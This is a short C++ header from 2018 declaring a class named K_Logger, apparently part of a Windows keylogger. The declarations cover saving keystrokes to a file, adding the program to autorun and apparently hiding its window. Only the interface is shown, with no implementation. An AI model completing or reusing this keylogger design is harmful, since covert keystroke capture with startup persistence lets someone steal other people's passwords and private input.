#pragma once


/*******************************************************************/

/* Date: 10-06-2018                                                */

/* Developer: Artem Gord1728                                       */

/* Copyright © 2018 Artem Gord1728. All rights reserved.           */

/* Description: Header with basic functionality                    */

/*******************************************************************/



#include <iostream>
#include <Windows.h>
#include <fstream>
#include <stdlib.h>
#include <string>
#include <time.h>
#include <stdio.h>



using std::fstream;
using std::cin;
using std::cout;
using std::endl;
using std::string;


class K_Logger
{
public:
	int SaveSymbol(WORD iKey, const string filePath);
	void AddToAutorun();

private:
	void WriteToDoc(LPCSTR text, const string filepath);

protected:
	void VisibilityApp();
}; 
